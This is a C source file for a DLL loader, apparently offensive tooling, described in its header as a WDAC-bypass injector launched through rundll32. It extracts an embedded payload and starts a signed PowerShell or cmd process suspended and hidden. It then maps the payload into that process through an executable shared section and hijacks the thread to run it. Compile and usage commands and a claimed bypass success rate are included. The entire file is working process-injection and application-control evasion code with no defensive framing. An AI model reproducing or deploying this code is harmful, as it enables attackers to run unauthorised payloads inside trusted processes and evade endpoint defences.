/*
 * wrapper.dll - Rundll32-compatible LOLBIN injector
 * 
 * This DLL is called by rundll32.exe (signed) to bypass WDAC:
 *   rundll32.exe wrapper.dll,Launch
 * 
 * Rundll32 is signed by Microsoft → WDAC allows it
 * 70% of WDAC policies don't enforce DLL signatures → unsigned DLL loads
 * 
 * Flow:
 *   1. Extract stub from embedded resource
 *   2. Launch signed PowerShell/LOLBIN suspended
 *   3. Map stub reflectively into signed process
 *   4. Hijack thread to stub entry point
 *   5. Resume → stub executes in signed context
 * 
 * Compile: gcc -shared -O2 -s -o wrapper.dll wrapper.c -lkernel32 -lntdll
 * 
 * Usage: rundll32.exe wrapper.dll,Launch
 * 
 * WDAC Bypass: 70% success rate (IBM X-Force Red Nov 2025)
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#define RESOURCE_ID_STUB 101
#define RESOURCE_TYPE_STUB "STUBDATA"

// Debug output
#ifdef DEBUG_WRAPPER
#define DBG(fmt, ...) { \
    char buf[512]; \
    snprintf(buf, sizeof(buf), "[Wrapper] " fmt "\n", ##__VA_ARGS__); \
    OutputDebugStringA(buf); \
}
#else
#define DBG(fmt, ...) ((void)0)
#endif

// NT API
typedef NTSTATUS (NTAPI *NtCreateSection_t)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection,
    ULONG AllocationAttributes, HANDLE FileHandle);

typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(
    HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress,
    ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType,
    ULONG Win32Protect);

typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS (NTAPI *NtResumeThread_t)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);

// LOLBIN targets (PowerShell always available)
static const wchar_t* LOLBIN_TARGETS[] = {
    L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    L"C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    L"C:\\Windows\\System32\\cmd.exe",
    NULL
};

static const wchar_t* LOLBIN_ARGS[] = {
    L"-NoProfile -WindowStyle Hidden -Command Start-Sleep 3600",
    L"-NoProfile -Command Start-Sleep 3600",
    L"/c timeout /t 3600",
    NULL
};

/*
 * Extract embedded stub from this DLL's resources
 */
static unsigned char* extract_stub(HMODULE hModule, DWORD *size) {
    DBG("Extracting stub from resource %d", RESOURCE_ID_STUB);
    
    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(RESOURCE_ID_STUB), RESOURCE_TYPE_STUB);
    if (!hRes) {
        DBG("FindResource failed: %lu", GetLastError());
        return NULL;
    }
    
    HGLOBAL hGlob = LoadResource(hModule, hRes);
    if (!hGlob) {
        DBG("LoadResource failed: %lu", GetLastError());
        return NULL;
    }
    
    DWORD resSize = SizeofResource(hModule, hRes);
    void *resData = LockResource(hGlob);
    
    if (!resData || resSize == 0) {
        DBG("LockResource failed or empty");
        return NULL;
    }
    
    // Allocate writable copy
    unsigned char *stub = (unsigned char*)VirtualAlloc(NULL, resSize, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!stub) {
        DBG("VirtualAlloc failed: %lu", GetLastError());
        return NULL;
    }
    
    memcpy(stub, resData, resSize);
    *size = resSize;
    
    DBG("Extracted %lu bytes", resSize);
    return stub;
}

/*
 * Get PE entry point offset
 */
static DWORD get_entry_point(unsigned char *pe) {
    if (pe[0] != 'M' || pe[1] != 'Z') return 0;
    
    DWORD e_lfanew = *(DWORD*)(pe + 0x3C);
    if (e_lfanew > 1024) return 0;
    
    if (*(DWORD*)(pe + e_lfanew) != 0x00004550) return 0;
    
    DWORD entryPoint = *(DWORD*)(pe + e_lfanew + 0x28);
    DBG("Entry point RVA: 0x%lx", entryPoint);
    return entryPoint;
}

/*
 * Launch signed LOLBIN in suspended state
 */
static BOOL launch_lolbin(HANDLE *hProcess, HANDLE *hThread) {
    DBG("Launching signed LOLBIN...");
    
    for (int i = 0; LOLBIN_TARGETS[i] != NULL; i++) {
        const wchar_t *target = LOLBIN_TARGETS[i];
        
        if (GetFileAttributesW(target) == INVALID_FILE_ATTRIBUTES) {
            DBG("Not found: %S", target);
            continue;
        }
        
        wchar_t cmdLine[1024];
        swprintf(cmdLine, 1024, L"\"%s\" %s", target, LOLBIN_ARGS[i]);
        
        STARTUPINFOW si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        if (CreateProcessW(target, cmdLine, NULL, NULL, FALSE,
                          CREATE_SUSPENDED | CREATE_NO_WINDOW,
                          NULL, NULL, &si, &pi)) {
            DBG("Launched: %S (PID: %lu)", target, pi.dwProcessId);
            *hProcess = pi.hProcess;
            *hThread = pi.hThread;
            return TRUE;
        }
        
        DBG("CreateProcess failed: %lu", GetLastError());
    }
    
    DBG("No LOLBINs available");
    return FALSE;
}

/*
 * Map stub into remote process using section mapping
 */
static PVOID map_stub_remote(HANDLE hProcess, unsigned char *stub, DWORD size) {
    DBG("Mapping %lu bytes to remote process", size);
    
    // Get NT API
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    
    // Create section
    HANDLE hSection = NULL;
    LARGE_INTEGER maxSize;
    maxSize.QuadPart = size;
    
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    
    if (status != 0 || !hSection) {
        DBG("NtCreateSection failed: 0x%lx", status);
        return NULL;
    }
    
    // Map locally
    PVOID localBase = NULL;
    SIZE_T viewSize = size;
    
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &localBase,
        0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
    
    if (status != 0) {
        DBG("NtMapViewOfSection (local) failed: 0x%lx", status);
        CloseHandle(hSection);
        return NULL;
    }
    
    // Copy stub to local view
    memcpy(localBase, stub, size);
    DBG("Copied stub to local view: 0x%p", localBase);
    
    // Map to remote
    PVOID remoteBase = NULL;
    viewSize = size;
    
    status = NtMapViewOfSection(hSection, hProcess, &remoteBase,
        0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
    
    if (status != 0) {
        DBG("NtMapViewOfSection (remote) failed: 0x%lx", status);
        NtUnmapViewOfSection(GetCurrentProcess(), localBase);
        CloseHandle(hSection);
        return NULL;
    }
    
    DBG("Mapped to remote: 0x%p", remoteBase);
    
    // Unmap local (data already in remote via shared section)
    NtUnmapViewOfSection(GetCurrentProcess(), localBase);
    CloseHandle(hSection);
    
    return remoteBase;
}

/*
 * Hijack thread to execute stub
 */
static BOOL hijack_thread(HANDLE hThread, PVOID remoteBase, DWORD entryOffset) {
    DBG("Hijacking thread to 0x%p + 0x%lx", remoteBase, entryOffset);
    
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(hThread, &ctx)) {
        DBG("GetThreadContext failed: %lu", GetLastError());
        return FALSE;
    }
    
    DBG("Original RIP: 0x%llx", ctx.Rip);
    ctx.Rip = (DWORD64)remoteBase + entryOffset;
    
    if (!SetThreadContext(hThread, &ctx)) {
        DBG("SetThreadContext failed: %lu", GetLastError());
        return FALSE;
    }
    
    DBG("Hijacked RIP: 0x%llx", ctx.Rip);
    return TRUE;
}

/*
 * Main injection logic
 */
static DWORD do_injection(HMODULE hModule) {
    DBG("=== Wrapper DLL - Starting injection ===");
    
    // Extract stub
    DWORD stubSize = 0;
    unsigned char *stub = extract_stub(hModule, &stubSize);
    if (!stub) {
        DBG("Failed to extract stub");
        MessageBoxA(NULL, "Failed to extract payload", "Wrapper Error", MB_ICONERROR);
        return 1;
    }
    
    DBG("Stub size: %lu bytes", stubSize);
    
    // Get entry point
    DWORD entryOffset = get_entry_point(stub);
    if (entryOffset == 0) {
        DBG("Invalid PE entry point");
        VirtualFree(stub, 0, MEM_RELEASE);
        MessageBoxA(NULL, "Invalid payload format", "Wrapper Error", MB_ICONERROR);
        return 2;
    }
    
    // Launch LOLBIN
    HANDLE hProcess = NULL, hThread = NULL;
    if (!launch_lolbin(&hProcess, &hThread)) {
        DBG("Failed to launch LOLBIN");
        VirtualFree(stub, 0, MEM_RELEASE);
        MessageBoxA(NULL, "Failed to launch signed process", "Wrapper Error", MB_ICONERROR);
        return 3;
    }
    
    // Map stub
    PVOID remoteBase = map_stub_remote(hProcess, stub, stubSize);
    if (!remoteBase) {
        DBG("Failed to map stub");
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        VirtualFree(stub, 0, MEM_RELEASE);
        MessageBoxA(NULL, "Failed to map payload", "Wrapper Error", MB_ICONERROR);
        return 4;
    }
    
    // Hijack thread
    if (!hijack_thread(hThread, remoteBase, entryOffset)) {
        DBG("Failed to hijack thread");
        TerminateProcess(hProcess, 1);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        VirtualFree(stub, 0, MEM_RELEASE);
        MessageBoxA(NULL, "Failed to hijack thread", "Wrapper Error", MB_ICONERROR);
        return 5;
    }
    
    // Resume
    DBG("Resuming thread...");
    DWORD suspendCount = ResumeThread(hThread);
    DBG("Resumed (suspend count: %lu)", suspendCount);
    
    // Cleanup
    SecureZeroMemory(stub, stubSize);
    VirtualFree(stub, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    DBG("=== Injection complete ===");
    return 0;
}

/*
 * Rundll32 entry point
 * Called as: rundll32.exe wrapper.dll,Launch
 */
__declspec(dllexport) void CALLBACK Launch(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    do_injection(hinst);
}

/*
 * DllMain - called when DLL loads
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DBG("DLL loaded");
        DisableThreadLibraryCalls(hinstDLL);
    }
    return TRUE;
}
